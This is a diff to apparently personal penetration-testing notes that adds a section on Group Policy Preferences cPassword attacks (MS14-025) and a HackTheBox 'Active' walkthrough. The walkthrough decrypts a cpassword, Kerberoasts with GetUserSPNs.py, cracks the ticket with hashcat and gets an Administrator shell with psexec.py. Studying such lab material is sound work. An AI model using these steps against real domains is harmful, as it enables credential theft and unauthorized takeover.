@@ -139,9 +139,40 @@ hashcat -m 13100 hashes.txt rockyou.txt
 * Strong Passwords
 * Least privileges
 
-## GPP / cPassword Attacks Overview
+## GPP / cPassword Attacks
 
-## Abusing GPP
+### GPP / cPassword Attacks Overview
+
+Group Policy Preferences (GPP) AKA MS14-025
+
+* Group Policy Preferences allowed admins to created policies using embedded credentials
+* These credentials were encrypted and placed in a "cPassword"
+* The key was accidentally released
+* Patched in MS14-025, but doesn't prevent previous uses
+
+Can check using `smb_enum_gpp` Metasploit module
+
+#### Resource
+
+[https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/](https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)
+
+### Abusing GPP
+
+Example using Active on HackTheBox.
+
+#### Part 1
+
+1. Downloaded files from SMB
+2. Found Groups.xml with `name-active.htb\SVC_TGS` and the `cpassword="<hash>"`
+3. Execute `gpp-decrypt` \<hash>
+
+#### Part 2
+
+1. &#x20;Tried `psexec.py active.htb/svc_tgs:<password>@<IP>` but failed...
+2. Then `GetUserSPNs.py active.htb/svc_tgs:<password> -dc-ip <IP> -request`
+   1. Returns a service ticket which we can copy and crack
+      1. hashcat -m 13100 hashes.txt rockyou.txt -O
+3. Finally psexec.py active.htb/Administrator:\<password>@\<IP>
 
 ## URL File Attacks
 
